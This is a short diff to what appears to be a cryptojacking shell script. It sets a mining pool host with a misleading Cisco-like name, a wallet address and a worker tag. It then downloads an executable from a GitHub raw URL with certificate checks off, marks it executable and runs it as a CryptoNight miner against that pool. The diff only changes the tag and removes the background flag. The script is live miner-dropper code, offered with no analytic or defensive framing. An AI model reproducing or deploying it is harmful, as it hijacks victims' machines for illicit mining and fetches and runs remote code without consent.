@@ -5,7 +5,7 @@
 END="cisco.viewdns.net"
 PORT="80"
 USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg"
-TAG="OSRUN-14"
+TAG="OSRUN-1219"
 
 _VERATU(){
 
@@ -31,7 +31,8 @@ _APP(){
      sysctl -w vm.nr_hugepages=128
      wget -c --tries=0 -T 2 --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/app
      chmod +x app
-     ./app -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     #./app -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     ./app -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
    ;; 
  esac
 }
